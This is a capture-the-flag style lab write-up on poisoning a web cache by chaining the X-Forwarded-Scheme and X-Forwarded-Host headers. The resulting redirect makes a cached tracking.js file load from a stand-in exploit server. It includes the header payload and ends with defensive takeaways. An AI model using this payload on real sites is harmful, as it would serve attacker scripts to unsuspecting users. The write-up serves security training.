# Lab: Web cache poisoning with multiple headers

## Description
This lab contains a web cache poisoning vulnerability that requires coordinating multiple unkeyed headers.

## Analysis
The application uses the `X-Forwarded-Scheme` header. If it's set to `http`, the application redirects to the same URL but with `https`.

```text
GET /resources/js/tracking.js HTTP/1.1
X-Forwarded-Scheme: http

HTTP/1.1 301 Moved Permanently
Location: https://[Host]/resources/js/tracking.js
```

The `X-Forwarded-Host` header is also used to determine the host in the `Location` header. By combining these, we can cause a redirect to a malicious script.

## Exploitation
I need to poison the cache for a specific JavaScript file.

### Steps
1. Find a JavaScript file that is being cached (e.g., `/resources/js/tracking.js`).
2. Send a request with both headers:
   - `X-Forwarded-Scheme: http`
   - `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
3. The response should be a `301` redirect to `https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/resources/js/tracking.js`.
4. Ensure your exploit server has a malicious script at that path.
5. Poison the cache until `X-Cache: hit` is received.
6. Now, whenever the application tries to load the tracking script, it will be redirected to your malicious version.

## Payload
```text
X-Forwarded-Scheme: http
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

## Takeaways
- Complex cache poisoning attacks often involve chaining multiple headers to manipulate the application's behavior.
- Redirects are a powerful vector for cache poisoning if the destination is controllable.
- Always review how headers like `X-Forwarded-*` are handled by both the cache and the application.
